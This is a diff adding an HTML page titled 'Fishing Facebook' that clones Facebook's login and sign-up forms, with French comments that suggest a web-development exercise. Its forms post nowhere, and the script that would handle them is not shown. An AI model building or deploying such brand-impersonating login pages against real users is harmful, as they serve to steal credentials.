@@ -1,0 +1,127 @@
+<!DOCTYPE html>
+<html lang="fr">
+    <head>
+        <meta charset="UTF-8">
+        <meta name="viewport" content="width=device-width, initial-scale=1.0">
+        <meta http-equiv="X-UA-Compatible" content="ie=edge">
+        <title>Fishing Facebook</title>
+        <link rel="stylesheet" href="css/style.css">
+        <link rel="shortcut icon" href="https://www.facebook.com/rsrc.php/yl/r/H3nktOa7ZMg.ico">
+    </head>
+    <body>
+        
+        <!-- Ouverture de page -->
+        <header>
+            <section>
+                <!-- Créer deux zones dans le header -->
+                <article>
+                    <a href="index.html"><img src="./img/logoFB.jpg" alt="Logo Facebook"></a>
+                </article>
+
+                <article>
+                    
+                    <!-- Ajouter une ID pour séectionner le form en JavaScript -->
+                    <form action="#" id="formLogIn">
+                        <fieldset>
+                            <label for="userName">Email or Phone</label>
+                            <input type="text" id="userName" name="userName">
+                        </fieldset>
+                        
+                        <fieldset>
+                            <label for="userPassword">Password</label>
+                            <input type="password" id="userPassword" name="userPassword">
+                            <a href="#">Forgot account?</a>
+                        </fieldset>
+                        <!-- <input type="submit" value="Log in"> -->
+                        <button type="submit">Log in</button>
+                    </form>
+                </article>
+            </section>
+        </header>
+
+        <!-- Contenu principal -->
+        <main>
+            <div>
+                <!-- Formulaire Sign Up -->
+                <section>
+                    <h1>Sign Up <span>It’s free and always will be.</span></h1>
+
+                    <form action="#">
+                        <fieldset>
+                            <!-- Ajouter un texte explicatif dans le input = placeholder -->
+                            <input type="text" placeholder="First name" name="firstName">
+                            <input type="text" placeholder="Last name" name="lastName">
+                            <input type="text" placeholder="Mobile number or email" name="userId">
+                            <input type="password" placeholder="New password" name="userPassword">
+                        </fieldset>
+
+                        <fieldset>
+                            <!-- Ajouter un titre dans un fieldset -->
+                            <legend>Birthday</legend>
+                            <ul>
+                                <li>
+                                    <select name="userMonth">
+                                        <option value="01">Janvier</option>
+                                        <option value="02">Février</option>
+                                        <option value="03">Mars</option>
+                                        <option value="04">Avril</option>
+                                    </select>
+                                </li>
+                                <li>
+                                    <select name="userDay">
+                                        <option value="18">18</option>
+                                    </select>
+                                </li>
+                                <li>
+                                    <select name="userYear">
+                                        <option value="1979">1979</option>
+                                    </select>
+                                </li>
+                                <li><a href="#">Why do I need to provide my birthday?</a></li>
+                            </ul>
+
+                            <p><input type="radio" name="gender" value="female"> Female</p>
+                            <p><input type="radio" name="gender" value="male"> Male</p>
+
+                        </fieldset>
+
+                        <p>By clicking Create Account, you agree to our Terms and that you have read our Data Policy, including our Cookie Use. You may receive SMS Notifications from Facebook and can opt out at any time.</p>
+
+                        <button type="submit">Create Account</button>
+                    </form>
+
+                    <p><a href="#">Create a page</a> for a celebrity, band or business.</p>
+                </section>
+                
+                <!-- Connect with friend -->
+                <section>
+                    <h2>Connect with friends and the world around you on Facebook.</h2>
+                    <ul>
+                        <li><b>See photos and updates</b> from friends in News Feed.</li>
+                        <li><b>Share what's new</b> in your life on your Timeline.</li>
+                        <li><b>Find more</b> of what you're looking for with Facebook Search.</li>
+                    </ul>
+                </section>
+            </div>
+        </main>
+
+        <!-- Fermeture de page -->
+        <footer>
+                <ul>
+                    <li><a href="#">English (US)</a></li>
+                    <li><a href="#">Français (France)</a></li>
+                    <li><a href="#">Español</a></li>
+                    <li><a href="#">Türkçe</a></li>
+                    <li><a href="#">Português (Portugal)</a></li>
+                    <li><a href="#">العربية</a></li>
+                    <li><a href="#">Italiano</a></li>
+                    <li><a href="#">Deutsch</a></li>
+                    <li><a href="#">हिन्दी中文(简体)</a></li>
+                    <li><a href="#">日本語</a></li>
+                </ul>
+        </footer>
+
+        <!-- Le Javascript est à ajouter juste avant la fin de la balise body -->
+        <script src="./js/script.js"></script>
+    </body>
+</html>
